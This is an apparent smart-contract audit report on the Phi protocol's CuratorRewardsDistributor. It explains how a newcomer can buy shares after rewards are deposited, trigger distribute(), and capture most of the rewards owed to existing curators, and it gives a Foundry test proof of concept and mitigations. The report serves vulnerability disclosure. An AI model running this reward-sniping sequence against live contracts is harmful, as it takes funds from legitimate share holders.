# Vulnerability details

## Impact
The distribute(credId) function in CuratorRewardsDistributor.sol gets the list of curators for a Cred ref https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L84 and simply distributes the rewards to current share holders of a cred ref https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L110 without taking into account who were the share holders (and thus legitimate claimers) at the time the rewards were deposited. The documentation clearly states that curators should earn a percentage of the minting fee when a user mints a CRED for which they have bought shares - there is no mention of rewarding potential/future share holders from current rewards ref https://docs.philand.xyz/explore-phi/phi-protocol/user-groups. 

Lets say users A & B hold 1 share each in a cred at time 't'. At time t+x, they are still holding the shares but now R ETH rewards have been accumulated due to trading and minting activity on the Cred. Thus, according to the spec since they are the share holders for this cred, the rewards accumulated so far belong to them. User C now comes along at time t+x+1 and buys 2 shares of the Cred and thus holds 50% of the shares for this Cred. User A now calls the distribute function (infact even user C can call distribute() himself). User C gets  (R-royalty_fee)*(2/4) share of the reward pot although none of it belongs to him. Now, there is a SHARE_LOCK_PERIOD and hence the price to buy/sell share might change when user C wants to sell the shares after getting the profit, and as the POC will show there will be reward amounts for which even after deducting the cost of trade (accounting for slippage during buy/sell) and gas fees, user C will still make a profit and thus, as a malicious actor, has enough incentive to exploit this vulnerability. This is a serious vulnerability as a sufficiently motivated actor which can invest the initial amount to buy shares can get most of the rewards belonging to present and legitimate curators at the time the rewards get deposited into the rewards contract.

## Proof of Concept
The following test can be added to CuratorRewardsDistributor.t.sol inside the foundry test folder as a POC
The comments in the test explain the exact steps to exploit the vulnerability

forge test --match-test testDistributeProblem -vvv

```
function testDistributeProblem() public {
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Signal creds for user1, the creator already holds 1 share
        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        // Deposit some ETH to the curatorRewardsDistributor
        // According to documentation, the following rewards being deposited should belong to curators
        // Currently curators are owner and user1
        // user2 is not a curator presently and hence any current reward should not belong to it
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // user2 buys 2 shares of the Cred
        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        uint256 initialUser2EthBalance = user2.balance;
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        assertEq(cred.getShareNumber(credId, owner), 1, "Signal count should be 1");
        assertEq(cred.getShareNumber(credId, user1), 1, "Signal count should be 1");
        assertEq(cred.getShareNumber(credId, user2), 2, "Signal count should be 2");
        assertEq(cred.getCurrentSupply(credId), 4, "Signal count should be 3");
        assertEq(cred.getCuratorAddressLength(credId), 3, "Signal count should be 3");

        // Record initial balances
        uint256 initialUser1Balance = phiRewards.balanceOf(user1);
        uint256 initialUser2Balance = phiRewards.balanceOf(user2);
        uint256 ownerBalance = owner.balance;
        
        // Distribute rewards - but now rewards get distributed to all current share holders
        // not just to those to whom the rewards belong
        vm.prank(owner);
        curatorRewardsDistributor.distribute(credId);

        // Check final balances
        uint256 finalUser1Balance = phiRewards.balanceOf(user1);
        uint256 finalUser2Balance = phiRewards.balanceOf(user2);
        uint256 finalOwnerBalance = owner.balance;


        // user2 now sells the 2 shares of Cred
        vm.startPrank(user2);

        vm.warp(vm.getBlockTimestamp()+1 hours);
        cred.sellShareCred(credId, 2, 0);
        vm.stopPrank();

        uint256 finalUser2EthBalance = user2.balance;

        // This represents slippage during buying and selling, protocol fees, royalties etc.
        // this does not include gas fees of buying, selling
        uint256 costOfTrade = initialUser2EthBalance - finalUser2EthBalance;

        // Rewards earned - costOfTrade is profit
        // As long as this is a sufficiently large value, the vulnerability can be exploited
        // i.e. if rewardsEarned > costOfTrade + gasFees then user2 can exploit the vulnerability
        
        uint256 profit = finalUser2Balance-initialUser2Balance-(costOfTrade);
        console2.log(initialUser2EthBalance); // initial investment
        console2.log(finalUser2EthBalance); 
        console2.log(costOfTrade); // cost of doing the trade to earn illegitimate rewards
        console2.log(finalUser2Balance - initialUser2Balance); // rewards earned
        console2.log(profit); // profit

        assert(profit > 0);

        // Assert the distribution
        assertEq(
            finalUser1Balance - initialUser1Balance,
            (depositAmount - depositAmount / 100) / 4,
            "User1 should receive 1/4 of the rewards"
        );
        assertEq(
            finalUser2Balance - initialUser2Balance,
            ((depositAmount - depositAmount / 100) * 2) / 4,
            "User2 should receive 2/4 of the rewards"
        );
        assertEq(
            finalOwnerBalance - ownerBalance, (depositAmount / 100), "Distributer should receive 1/100 of the rewards"
        );

        // Check that the balance in curatorRewardsDistributor is now 0
        assertEq(
            curatorRewardsDistributor.balanceOf(credId),
            0,
            "CuratorRewardsDistributor balance should be 0 after distribution"
        );
    }
```

## Recommended Mitigation Steps

There are several possible mitigations for this issue

1. The older/current curators can call distribute(credId) before the reward pot is big enough to justify cost of trade and gas fees for the attacker (new curator). This is the simplest mitigation and does not require any code change.

2. Buying shares currently causes inflation and value of rewards for existing share holders to decrease. Thus an inflation resistant design will help mitigate the issue. Let R be the current total reward available to be claimed by curators and S the sum of total number of shares in the system. Let a user buy s' new shares for a Cred. We increase the total reward pool by an amount R*(s'/S) and mark this reward as claimed by the user who bought s' new shares. Till actual new reward is added to the system, user buying s' new shares will not be able to claim any reward. This prevents the existing curator rewards from getting diluted.

3. The price of a Cred share does not take into account the value accrued due to the rewards that keep accumulating in the rewards contract. The point at which rewards get deposited during a mint for a Cred is like dividend being awarded for a traditional listed company and its corresponding share price on the markets increases to reflect this. However, current design does not take into account such value that has accumulated for shares. This creates a mispriced asset which along with the rewards distribution mechanism creates the incentive to exploit the vulnerability. Rectifying this involves a bigger protocol level design change.
